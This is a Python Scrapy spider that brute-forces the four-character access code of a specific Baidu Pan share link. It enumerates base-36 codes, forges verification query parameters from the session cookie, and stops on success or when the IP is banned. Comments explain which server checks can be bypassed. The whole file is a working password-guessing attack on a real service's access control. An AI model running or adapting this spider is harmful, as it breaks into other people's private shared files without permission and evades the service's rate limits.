import base64
import json
import time
from http.cookies import SimpleCookie
from typing import Iterable
from urllib.parse import urlencode

import scrapy
from scrapy import Request, FormRequest
from scrapy.exceptions import CloseSpider
from scrapy.http import Response


def parse_param_lines(s: str, separator=': ') -> dict:
    def kv(line):
        k, v = line.split(separator)
        return (k.strip(), v)  # drop space of key
    
    return dict(kv(line) for line in s.splitlines() if line)


assert parse_param_lines("""a: 3
        b: 5""") == {"a": "3", "b": "5"}


def b64_encode(s: str) -> str:
    return base64.b64encode(s.encode("ascii")).decode("ascii")


assert b64_encode("B368A4CA85CCBF7F286652FDC4CBF7AB:FG=1") == "QjM2OEE0Q0E4NUNDQkY3RjI4NjY1MkZEQzRDQkY3QUI6Rkc9MQ=="


def get_timestamp_ms():
    return int(time.time() * 1000)


assert len(str(get_timestamp_ms())) == 13

CHARSET = '0123456789abcdefghijklmnopqrstuvwxyz'
CHARS_N = len(CHARSET)
CODE_SPACE_SIZE = 1  # CHARS_N ** 4


def gen_code(index=0, machines_n=1, machine_cur=0):
    def convert(num):
        result = ['0'] * 4
        for i in range(3, -1, -1):
            num, remainder = divmod(num, 36)
            result[i] = CHARSET[int(remainder)]
        return ''.join(result)
    
    start = CODE_SPACE_SIZE / machines_n * machine_cur + index
    return convert(start)


class BasicSpider(scrapy.Spider):
    name = "basic"
    allowed_domains = ["pan.baidu.com"]
    
    target_id = 'rX2X3ELN90y55Tiqcba3nw'
    
    def start_requests(self) -> Iterable[Request]:
        for i in range(CODE_SPACE_SIZE):
            code = gen_code(i)
            yield Request(
                f'https://pan.baidu.com/share/init?surl={self.target_id}',
                meta={
                    "code": code
                },
                dont_filter=True,
                callback=self.parse_init
            )
    
    def parse_init(self, response: Response):
        code = response.meta['code']
        
        # ref: GPT + https://docs.scrapy.org/en/latest/topics/downloader-middleware.html?highlight=cookie#cookies-debug
        cookie_jar = SimpleCookie()
        for cookie_item in response.headers.getlist('Set-Cookie'): cookie_jar.load(cookie_item.decode("utf-8"))
        baidu_id = cookie_jar.get('BAIDUID').value
        
        print({
            "code": response.meta['code'],
            "baidu_id": baidu_id
        })
        
        query = {
            # channel, web, app_id, bdstoken, clienttype 都可以固定，fields 应该可以不要
            "channel": "chunlei",
            "web": 1,
            "app_id": 250528,
            "bdstoken": "",
            "clienttype": 0,  # 缺少会403
            
            # dp-logid 是基于一些信息拼接起来的（见上图），也可以固定，服务器没有做校验
            "dp-logid": 83575600200067350013,
            
            # logid 是 cookie 中 BAIDU_ID 的 base64 形式，直接构造
            "logid": b64_encode(baidu_id),
            
            # suid 是目标id，直接构造
            "surl": self.target_id,
            
            # t 是微秒时间戳，直接构造
            "t": get_timestamp_ms(),
        }
        
        data = {
            "pwd": code,
            "vcode": "",
            "vcode_str": ""
        }
        # 要用 form，而非 json
        yield FormRequest(
            response.urljoin("/share/verify?" + urlencode(query)),
            formdata=data,
            meta={"code": code},
            callback=self.parse_verification
        )
    
    def parse_verification(self, response: Response):
        code = response.meta['code']
        
        data = json.loads(response.text)
        yield {"code": code, "response": data}
        
        errno = data['errno']
        
        if errno == 0:
            raise CloseSpider(f"成功！验证码是：【{code}】")
        
        if errno == -62:
            raise CloseSpider(f"IP被 ban！")
        
        if errno == -64:
            raise CloseSpider(f"需要登录！")
        
        elif errno in [-12, -9]:
            print('验证码不对')
            return
